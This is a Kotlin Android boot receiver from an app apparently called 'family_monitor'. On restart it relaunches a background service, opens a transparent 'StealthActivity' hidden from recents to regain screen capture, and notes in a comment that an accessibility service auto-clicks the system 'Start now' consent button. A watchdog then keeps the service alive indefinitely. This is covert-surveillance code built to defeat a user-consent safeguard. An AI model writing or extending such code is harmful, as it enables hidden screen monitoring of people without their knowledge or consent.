package com.example.family_monitor

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val valid = listOf(
            Intent.ACTION_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            Intent.ACTION_MY_PACKAGE_REPLACED
        )
        if (intent.action !in valid) return

        val prefs     = context.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        val wizardDone = prefs.getBoolean("flutter.wizard_done", false)
        val uid        = prefs.getString("flutter.child_uid", null)
        if (!wizardDone || uid.isNullOrEmpty()) return

        // 1. Flutter background service
        val bgSvc = Intent(context,
            id.flutter.flutter_background_service.BackgroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            context.startForegroundService(bgSvc)
        else context.startService(bgSvc)

        // 2. Re-acquire MediaProjection via transparent StealthActivity.
        //    SilentAccessibilityService will auto-click "Start now".
        try {
            context.startActivity(
                Intent(context, StealthActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                             Intent.FLAG_ACTIVITY_NO_HISTORY or
                             Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                }
            )
        } catch (_: Exception) {}

        // 3. Arm watchdog so service is kept alive indefinitely
        WatchdogReceiver.schedule(context)
    }
}
